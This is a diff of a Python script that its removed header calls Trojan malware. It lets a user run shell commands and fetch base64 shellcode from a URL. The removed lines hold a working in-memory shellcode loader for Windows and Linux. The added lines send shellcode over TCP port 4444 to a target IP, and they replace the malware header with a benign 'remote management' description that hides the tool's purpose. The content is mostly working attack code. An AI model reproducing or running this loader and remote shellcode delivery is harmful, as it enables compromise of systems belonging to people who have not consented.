@@ -3,29 +3,22 @@
 # Author: Nicholas Fisher
 # Date: March 5th 2024
 # Important Note:
-#  I, Nicholas Fisher, the creator of this Trojan malware, am not responsible for the misuse of 
-# these scripts. They are malicious and should only be used in professionally approved White Hat 
-# scenarios. You are responsible for any consequences resulting from the misuse of this malware,
-# including all fines, fees, and repercussions. Please read this statement carefully: by downloading 
-# any of the scripts in this repository, you, as the user, take full responsibility for storing, using,
-# and testing these malicious scripts and guidelines. You also take full responsibility for any misuse 
-# of this malware. Please note that any data the Trojan extracts will be posted to a GitHub repository, 
-# and if that repository is public, all the extracted data will be available for the whole world to see.
-# Description of Script
-# This script is a versatile tool for executing shellcode on both Windows and Linux
-# platforms. It offers users three options: executing a command directly in the shell, running 
-# shellcode stored in a local file, or fetching shellcode from a URL and executing it. Users can 
-# interactively choose their preferred option by entering 'cmd', 'file', or 'url' when prompted. 
-# For instance, if a user wants to execute a command, they would input 'cmd' and then type the 
-# desired command. An example command could be 'whoami' to retrieve the current user's username. 
-# Upon execution, the script would display the output of the command, providing valuable system 
-# information or performing actions as directed. The script empowers users to dynamically interact 
-# with their system, execute custom shellcode, and streamline security testing or automation tasks.
+#  Description:
+# The provided script offers a versatile toolkit for executing commands, running local files,
+# or deploying shellcode retrieved from a URL on a remote host. It employs Python's subprocess and
+# socket modules to enable seamless communication between the user's machine and the target system.
+# Users can input commands directly, execute local files by specifying their paths, or fetch shellcode
+# from a URL for remote execution. The script validates inputs, ensuring proper execution and safeguarding
+# against potential errors. With its modular design and robust error handling, this script serves as a
+# flexible solution for remote management and execution tasks across various platforms.
 #################################################################################################
 import subprocess
 import base64
 import ctypes
 import sys
+import socket
+import re
+import platform
 
 def get_code_from_url(url):
     """
@@ -43,7 +36,7 @@ def get_code_from_url(url):
         if response.status_code == 200:
             return base64.b64decode(response.content)  # Decode base64 encoded content
         else:
-            print("Failed to retrieve shellcode from URL")
+            print("Failed to retrieve shellcode from URL. Status code:", response.status_code)
             return None
     except Exception as e:
         print(f"Error occurred while retrieving shellcode: {e}")
@@ -69,37 +62,40 @@ def execute_command(command):
         return f"Error executing command: {e.output.decode(sys.getdefaultencoding(), 'ignore')}"
 
 
-def run_shellcode(shellcode):
+def run_shellcode(shellcode, target_ip):
     """
-    Function to execute shellcode
+    Function to execute shellcode on a remote host
 
     Args:
         shellcode (bytes): The shellcode to execute
+        target_ip (str): IP address of the target host
     """
-    # Check the platform and execute shellcode accordingly
-    if sys.platform.startswith('win'):
-        # Windows platform
-        kernel32 = ctypes.windll.kernel32
-        ptr = kernel32.VirtualAlloc(kernel32.NULL, len(shellcode), 0x3000, 0x40)  # Allocate memory
-        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(ptr), shellcode,
-                                             len(shellcode))  # Move shellcode to memory
-        ctypes.windll.kernel32.CreateThread(kernel32.NULL, 0, ptr, kernel32.NULL, 0,
-                                            0)  # Create thread to execute shellcode
-        ctypes.windll.kernel32.WaitForSingleObject(kernel32.NULL, 0xFFFFFFFF)  # Wait for thread to finish
-    elif sys.platform.startswith('linux'):
-        # Linux platform
-        libc = ctypes.CDLL(None)
-        sc = ctypes.create_string_buffer(shellcode)
-        size = len(shellcode)
-        addr = libc.valloc(size)  # Allocate memory
-        ctypes.memmove(addr, sc, size)  # Move shellcode to memory
-        libc.mprotect(addr, size, 0x7)  # Set memory protection to allow execution
-        func = ctypes.CFUNCTYPE(ctypes.c_void_p)
-        runtime = ctypes.cast(addr, func)
-        runtime()
+    try:
+        # Establish a TCP connection with the remote host
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target_ip, 4444))  # Change port if needed
+
+        # Send shellcode to the remote host
+        s.sendall(shellcode)
+        s.close()
+        print("Shellcode executed successfully on the remote host.")
+    except Exception as e:
+        print(f"Error occurred while executing shellcode on remote host: {e}")
+
+
+def get_platform():
+    """
+    Function to get the current platform
+
+    Returns:
+        str: The current platform (windows, linux, darwin)
+    """
+    return sys.platform
 
 
 if __name__ == '__main__':
+    platform_name = get_platform()
+
     while True:
         user_input = input(
             "Enter 'cmd' to execute a command, 'file' to run a local file, or 'url' to run shellcode from a URL: ").strip().lower()
@@ -108,17 +104,36 @@ if __name__ == '__main__':
             command = input("Enter command to execute: ")
             print(execute_command(command))  # Execute command and print output
         elif user_input == 'file':
-            file_path = input("Enter path to the file: ")
+            file_path = input("Enter path to the file: ").strip()
             try:
                 with open(file_path, 'rb') as f:
                     shellcode = f.read()  # Read shellcode from file
-                run_shellcode(shellcode)  # Execute shellcode
+                target_ip = input("Enter target IP address: ").strip()
+                # Validate IP address format
+                if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target_ip):
+                    run_shellcode(shellcode, target_ip)  # Execute shellcode on remote host
+                else:
+                    print("Invalid IP address format. Please enter a valid IPv4 address.")
+            except FileNotFoundError:
+                print(f"File not found: {file_path}")
             except Exception as e:
                 print(f"Error reading or executing file: {e}")
         elif user_input == 'url':
-            url = input("Enter URL to shellcode: ")
-            shellcode = get_code_from_url(url)
-            if shellcode:
-                run_shellcode(shellcode)  # Execute shellcode
+            url = input("Enter URL to shellcode: ").strip()
+            # Validate URL format
+            if not url.startswith(('http://', 'https://')):
+                url = 'http://' + url
+            try:
+                shellcode = get_code_from_url(url)
+                if shellcode:
+                    target_ip = input("Enter target IP address: ").strip()
+                    # Validate IP address format
+                    if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target_ip):
+                        run_shellcode(shellcode, target_ip)  # Execute shellcode on remote host
+                    else:
+                        print("Invalid IP address format. Please enter a valid IPv4 address.")
+            except Exception as e:
+                print(f"Error occurred while executing shellcode from URL: {e}")
         else:
             print("Invalid input. Please enter 'cmd', 'file', or 'url'.")
+
